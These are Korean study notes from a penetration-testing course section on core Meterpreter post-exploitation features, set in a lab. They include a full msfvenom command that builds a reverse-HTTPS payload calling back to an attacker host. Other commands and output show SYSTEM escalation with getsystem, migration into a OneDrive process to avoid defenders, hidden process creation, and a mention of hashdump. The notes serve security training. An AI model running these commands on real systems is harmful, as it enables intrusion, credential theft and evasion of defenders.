# 21.3.1 Meterpreter 포스트 익스플로잇 핵심 기능

> **Core Meterpreter Post-Exploitation Features** · PEN-200 §21.3.1

⚠️ **Linux Meterpreter 는 Windows 판보다 포스트 익스플로잇 기능이 적음.** 그래서 이 절의 실습 대상은 Windows 머신임.

전제 상황은 이미 발판을 잡아 bind 셸로 타겟에 붙어 있는 상태임. 여기에 non-staged Meterpreter 페이로드를 담은 Windows 실행 파일을 msfvenom 으로 만들어 올림.

```
kali@kali:~$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.4
LPORT=443 -f exe -o met.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 201820 bytes
Final size of exe file: 208384 bytes
Saved as: met.exe
```

수신 측은 `multi/handler` 에 같은 페이로드와 포트를 지정해 띄움.

```
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_https
payload => windows/x64/meterpreter_reverse_https
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > run
[*] Exploit running as background job 2.
[*] Exploit completed, but no session was created.
[*] Started HTTPS reverse handler on https://192.168.119.4:443
```

이후 Python3 웹서버로 `met.exe` 를 서빙하고, bind 셸에서 PowerShell 로 내려받아 실행하면 Meterpreter 세션이 열림.

```
kali@kali:~$ nc 192.168.50.223 4444

C:\Users\dave> powershell
```

**`idletime` — 사용자가 자리에 있는가.** 현재 사용자가 얼마나 조작을 안 했는지 보여줌. 사용자·OS 같은 기본 정보를 얻은 «직후» 쳐야 하는 명령임 — 타겟 머신이 지금 사용 중인지 아닌지를 알려주기 때문임.

```
meterpreter > idletime
User has been idle for: 9 mins 53 secs
```

사용자가 자리를 비웠다고 판단되면, CMD·PowerShell 창이 한순간 뜰 수 있는 프로그램·명령을 실행할 여지가 생김.

**`getsystem` — SYSTEM 자동 승격.** 포스트 익스플로잇 기능 중 여럿이 관리자 권한을 요구함. `getsystem` 은 named pipe 사칭과 토큰 복제 계열 기법으로 `NT AUTHORITY\SYSTEM` 승격을 자동 시도함. 기본 설정에서는 가용한 기법을 모두 동원하며 노리는 것은 `SeImpersonatePrivilege` 와 `SeDebugPrivilege` 임. 그래서 치기 전에 대화형 셸에서 `whoami /priv` 로 둘 중 하나를 갖고 있는지 확인함.

```
meterpreter > shell
...
C:\Users\luiza> whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= ========
...
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
...
C:\Users\luiza> exit
exit
```

```
meterpreter > getuid
Server username: ITWK01\luiza
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

예시에서는 기법 5(Named Pipe Impersonation, PrintSpooler 변종)로 승격됨 — Windows 권한 상승 모듈에서 손으로 했던 것과 같은 기법임.

**`migrate` — 실행 프로세스 옮기기.** Meterpreter 페이로드는 «공격했거나 페이로드를 실행시킨 그 프로세스 안에서» 돎. 따라서 피해자가 그 프로세스를 닫으면 접근도 같이 끊김. 게다가 페이로드를 담은 바이너리 이름이 그대로 프로세스 목록에 남아 방어자가 목록을 훑을 때 튐. `migrate` 는 페이로드 실행을 다른 프로세스로 옮기는 명령이고, 후보는 `ps` 로 봄.

```
meterpreter > ps
Process List
============
 PID   PPID  Name                         Arch  Session  User
Path
 ---   ----  ----                         ----  -------  ----
----
 2552   8500  met.exe                      x64   0        ITWK01\luiza
C:\Users\luiza\met.exe
...
 8052   4892  OneDrive.exe                 x64   1        ITWK01\offsec
C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe
...
```

`met.exe`(PID 2552)는 이름과 경로 모두 눈에 띄는 반면, 사용자 offsec 이 띄운 OneDrive 프로세스(PID 8052) 안에서 돌면 목록 검토로는 훨씬 덜 잡힘.

⚠️ **이주 대상은 «현재 프로세스와 같거나 낮은» 무결성·권한 수준의 프로세스뿐임.** 예시는 이미 SYSTEM 으로 올라가 있어 선택폭이 넓었음.

⚠️ `migrate` 가 undefined method pid for nil 오류를 내면 Metasploit 을 최신 버전으로 갱신할 것.

`migrate` 에 PID 를 붙여 이주하면 원래 프로세스 `met.exe`(2552)는 목록에서 사라지고, 이어서 친 `ps` 의 출력 정보량도 줄어듦. 이제 PID 8052 프로세스의 컨텍스트, 즉 사용자 offsec 으로 돌기 때문임 — 이주는 SYSTEM 에서 일반 사용자로 «내려가는» 결과도 낳음.

```
meterpreter > migrate 8052
[*] Migrating from 2552 to 8052...
[*] Migration completed successfully.
meterpreter > ps
Process List
============
 PID   PPID  Name                         Arch  Session  User                Path
 ---   ----  ----                         ----  -------  ----                ----
...
 2440   668   svchost.exe
 2472   668   svchost.exe
 2496   668   svchost.exe
 2568   668   svchost.exe
 2624   668   spoolsv.exe
 2660   668   svchost.exe
 2784   668   svchost.exe
 2928   668   svchost.exe
...
```

```
meterpreter > getuid
Server username: ITWK01\offsec
```

**`execute` — 이주할 프로세스를 새로 만들기.** 기존 프로세스로 옮기는 대신, 또는 마땅한 이주 대상이 없을 때는 `execute` 로 프로세스를 새로 띄우고 거기로 옮김. `-H` 는 화면에 보이지 않게 생성하는 옵션이고, `-f` 는 실행할 명령·프로그램을 지정함.

```
meterpreter > execute -H -f notepad
Process 2720 created.
meterpreter > migrate 2720
[*] Migrating from 8052 to 2720...
[*] Migration completed successfully.
meterpreter >
```

`-H` 로 숨겨 띄워도 작업 관리자 같은 도구의 프로세스 목록에는 그대로 나옴.

이 밖에 `hashdump`(SAM 데이터베이스 내용 덤프), `screenshare`(타겟 데스크톱 실시간 표시) 같은 기능도 있음. 여기서 다룬 기본 기능을 넓히는 것은 별도의 포스트 익스플로잇 모듈들이 담당함.
